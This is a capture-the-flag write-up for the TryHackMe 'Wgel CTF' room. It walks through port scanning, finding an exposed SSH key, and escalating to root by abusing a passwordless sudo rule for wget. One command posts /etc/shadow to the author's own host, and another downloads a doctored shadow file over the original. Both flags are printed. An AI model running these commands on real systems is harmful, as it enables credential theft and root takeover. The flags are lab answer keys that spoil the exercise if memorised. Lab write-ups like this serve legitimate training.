# Wgel CTF

Can you exfiltrate the root flag?

Room URL: https://tryhackme.com/room/wgelctf

---

# Task 1

No info given. Let's run a portscan. Just two open ports.

```
$ nmap -sC -sV 10.10.9.43
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-02 13:17 CEST
Nmap scan report for 10.10.9.43
Host is up (0.040s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Gobuster shows a `/sitemap` and on the index in the source I found the follwing:
```
 <!-- Jessie don't forget to udate the webiste -->
```

Possibly some outdated software? And a hint at a possible username `Jessie`

`/sitemap` is actually a full fledged website. But I can't really find anything
useful on there. After running gobuster again on the `/sitemap` address I found
a `/.ssh` folder which actually contains a valid ssh key!


1. User flag

The ssh key allows us to log in to the machine as the `jessie` user. Seems the
user flag is located in the Documents folder in the homedir of jessie:
```
$ find / -type f -name "*flag*" 2>/dev/null
/home/jessie/Documents/user_flag.txt
```

```
057c67131c3d5e42dd5cd3075b198ff6
```

2. Root flag

`sudo -l` shows we can run `/usr/bin/wget` as root without password:

```
User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

Seeing that we can wget to both POST and GET files, we could POST the contents
of `/etc/shadow` file to set a password on the root user and then GET that file
to log in as root with our custom password.

```
jessie@CorpOne:~$ sudo /usr/bin/wget --post-file=/etc/shadow 10.8.39.224:8888
--2020-06-02 14:48:46--  http://10.8.39.224:8888/
Connecting to 10.8.39.224:8888... connected.
HTTP request sent, awaiting response... No data received.
```

On my laptop I saved the file and inserted my custom root password which I
generated by using `openssl passwd -6 -salt xyz mypassword`. Then I started an
http server with python3 from my working directory and retrieved that file with
wget:

```
jessie@CorpOne:~$ sudo /usr/bin/wget http://10.8.39.224:9999/custom_shadow -O /etc/shadow
--2020-06-02 14:50:42--  http://10.8.39.224:9999/custom_shadow
Connecting to 10.8.39.224:9999... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1365 (1,3K) [application/octet-stream]
Saving to: ‘/etc/shadow’

/etc/shadow               100%[==================================>]   1,33K  --.-KB/s    in 0s

2020-06-02 14:50:42 (164 MB/s) - ‘/etc/shadow’ saved [1365/1365]

jessie@CorpOne:~$ su root
Password:
root@CorpOne:/home/jessie# ls /root
root_flag.txt
root@CorpOne:~# cat root_flag.txt
```

```
b1b968b37519ad1daa6408188649263d
```